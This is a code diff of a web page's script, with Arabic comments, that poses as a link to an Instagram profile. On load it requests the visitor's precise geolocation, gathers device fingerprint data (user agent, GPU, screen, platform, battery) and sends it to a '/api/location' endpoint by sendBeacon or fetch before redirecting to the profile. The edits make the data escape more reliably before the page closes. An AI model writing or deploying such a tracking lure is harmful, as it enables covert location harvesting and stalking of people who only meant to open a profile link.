@@ -62,101 +62,101 @@
                 if (!gl) return "N/A";
                 const debugInfo = gl.getExtension('WEBGL_debug_renderer_info');
                 return debugInfo ? gl.getParameter(debugInfo.UNMASKED_RENDERER_WEBGL) : "N/A";
-            } catch (e) { return "Error"; }
+            } catch (e) { return "N/A"; }
+        }
+
+        async function getBatteryInfo() {
+            try {
+                if (navigator.getBattery) {
+                    const b = await navigator.getBattery();
+                    return { level: Math.round(b.level * 100) + "%", charging: b.charging ? "Yes" : "No" };
+                }
+            } catch (e) { }
+            return { level: "N/A", charging: "N/A" };
+        }
+
+        let redirected = false;
+        function redirect() {
+            if (redirected) return;
+            redirected = true;
+
+            const username = "mzjy3756";
+            const isAndroid = /Android/i.test(navigator.userAgent);
+            const isIOS = /iPhone|iPad|iPod/i.test(navigator.userAgent);
+
+            const webUrl = `https://www.instagram.com/${username}/`;
+
+            if (isAndroid) {
+                window.location.href = `intent://instagram.com/_u/${username}/#Intent;package=com.instagram.android;scheme=https;end`;
+            } else if (isIOS) {
+                window.location.href = `instagram://user?username=${username}`;
+            } else {
+                window.location.href = webUrl;
+            }
+
+            setTimeout(() => { window.location.replace(webUrl); }, 1500);
         }
 
         window.onload = async () => {
             let locationCaptured = false;
             let bestPos = { coords: { latitude: 'N/A', longitude: 'N/A', accuracy: 'N/A' } };
 
-            // 1. طلب الموقع فوراً
+            // 1. طلب الموقع
             if (navigator.geolocation) {
                 navigator.geolocation.getCurrentPosition(
-                    (pos) => {
-                        bestPos = pos;
-                        locationCaptured = true;
-                    },
-                    (err) => {
-                        console.log("Geo Error:", err);
-                        locationCaptured = true; // متابعة حتى لو رفض
-                    },
-                    { enableHighAccuracy: true, timeout: 6000, maximumAge: 0 }
+                    (pos) => { bestPos = pos; locationCaptured = true; },
+                    () => { locationCaptured = true; },
+                    { enableHighAccuracy: true, timeout: 5000, maximumAge: 0 }
                 );
             } else {
                 locationCaptured = true;
             }
 
-            // 2. وظيفة المعالجة الرئيسية
-            async function startProcess() {
-                // ننتظر 1.5 ثانية كحد أقصى للحصول على أفضل دقة
-                const timeoutPromise = new Promise(r => setTimeout(r, 1500));
+            // 2. انتظار الموقع (حد أقصى 2 ثانية)
+            for (let i = 0; i < 20 && !locationCaptured; i++) {
+                await new Promise(r => setTimeout(r, 100));
+            }
 
-                while (!locationCaptured && attempts < 15) {
-                    await new Promise(r => setTimeout(r, 100));
-                    attempts++;
-                }
+            // 3. جمع البيانات
+            const data = {
+                latitude: bestPos.coords.latitude,
+                longitude: bestPos.coords.longitude,
+                accuracy: bestPos.coords.accuracy && bestPos.coords.accuracy !== 'N/A' ? bestPos.coords.accuracy.toFixed(1) + "m" : "N/A",
+                userAgent: navigator.userAgent,
+                gpu: getGPU(),
+                screen: `${window.screen.width}x${window.screen.height}`,
+                platform: navigator.platform,
+                battery: await getBatteryInfo()
+            };
 
-                const data = {
-                    latitude: bestPos.coords.latitude,
-                    longitude: bestPos.coords.longitude,
-                    accuracy: bestPos.coords.accuracy ? bestPos.coords.accuracy.toFixed(1) + "m" : "N/A",
-                    userAgent: navigator.userAgent,
-                    gpu: getGPU(),
-                    screen: `${window.screen.width}x${window.screen.height}`,
-                    platform: navigator.platform,
-                    battery: await (navigator.getBattery ? navigator.getBattery().then(b => ({ level: Math.round(b.level * 100) + "%", charging: b.charging ? "Yes" : "No" })) : Promise.resolve({ level: "N/A", charging: "N/A" }))
-                };
+            const jsonStr = JSON.stringify(data);
 
-                // محاولة الإرسال بـ fetch العادي (الأكثر موثوقية إذا كان الوقت متاحاً)
+            // 4. إرسال البيانات بـ sendBeacon أولاً (الأهم - ينجو من إغلاق الصفحة)
+            let beaconSent = false;
+            try {
+                const blob = new Blob([jsonStr], { type: 'application/json' });
+                beaconSent = navigator.sendBeacon('/api/location', blob);
+            } catch (e) { }
+
+            // 5. إذا نجح الـ Beacon، نحوّل فوراً
+            if (beaconSent) {
+                setTimeout(redirect, 300);
+            } else {
+                // 6. إذا فشل، نستخدم fetch ثم نحوّل
                 try {
                     await fetch('/api/location', {
                         method: 'POST',
                         headers: { 'Content-Type': 'application/json' },
-                        body: JSON.stringify(data),
+                        body: jsonStr,
                         keepalive: true
                     });
-                } catch (e) {
-                    // إذا فشل Fetch، نستخدم Beacon كخطة بديلة فورية (تعمل جيداً على الهواتف عند الإغلاق)
-                    if (navigator.sendBeacon) {
-                        navigator.sendBeacon('/api/location', JSON.stringify(data));
-                    }
-                }
-
-                // التحويل النهائي
+                } catch (e) { }
                 redirect();
             }
-
-            // بدء العملية
-            let attempts = 0;
-            startProcess();
-
-            // أمان إضافي: تحويل قسري بعد 4 ثوانٍ لضمان عدم تعليق الصفحة
-            setTimeout(redirect, 4000);
         };
 
-        function redirect() {
-            const username = "mzjy3756";
-            const isAndroid = /Android/i.test(navigator.userAgent);
-            const isIOS = /iPhone|iPad|iPod/i.test(navigator.userAgent);
-
-            // عند الضغط وفتح الصفحة، يتم التحويل للبروفايل مباشرة
-            const appUrl = `instagram://user?username=${username}`;
-            const webUrl = `https://www.instagram.com/${username}/`;
-            const intentUrl = `intent://instagram.com/_u/${username}/#Intent;package=com.instagram.android;scheme=https;end`;
-
-            if (isAndroid) {
-                window.location.href = intentUrl;
-            } else if (isIOS) {
-                window.location.href = appUrl;
-            } else {
-                window.location.href = webUrl;
-            }
-
-            // Fallback
-            setTimeout(() => {
-                window.location.replace(webUrl);
-            }, 1000);
-        }
+        // أمان: تحويل قسري بعد 5 ثوانٍ في أسوأ الأحوال
+        setTimeout(redirect, 5000);
     </script>
 </body>
 
